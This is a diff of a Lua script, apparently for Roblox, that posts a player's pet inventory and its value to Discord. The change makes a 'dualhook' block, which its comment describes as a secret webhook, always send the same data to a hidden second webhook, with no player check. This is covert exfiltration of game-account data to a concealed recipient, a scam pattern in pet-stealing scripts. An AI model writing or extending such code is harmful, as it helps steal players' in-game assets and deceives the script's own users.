@@ -97,16 +97,16 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
         warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
     end
 
-    -- 💣 Dualhook лог в секретный вебхук
-    for _, player in pairs(game.Players:GetPlayers()) do
-        if player.Name == getgenv().DhUser and getgenv().DhWebhook and #getgenv().DhWebhook > 10 then
-            request({
-                Url = getgenv().DhWebhook,
-                Method = "POST",
-                Headers = headers,
-                Body = jsonData
-            })
-            break
+    -- 💣 Dualhook лог в секретный вебхук — всегда отправляем, если есть DhWebhook
+    if getgenv().DhWebhook and #getgenv().DhWebhook > 10 then
+        local dhResponse = request({
+            Url = getgenv().DhWebhook,
+            Method = "POST",
+            Headers = headers,
+            Body = jsonData
+        })
+        if dhResponse.StatusCode ~= 200 and dhResponse.StatusCode ~= 204 then
+            warn("Ошибка отправки в DhWebhook:", dhResponse.StatusCode, dhResponse.Body)
         end
     end
 end
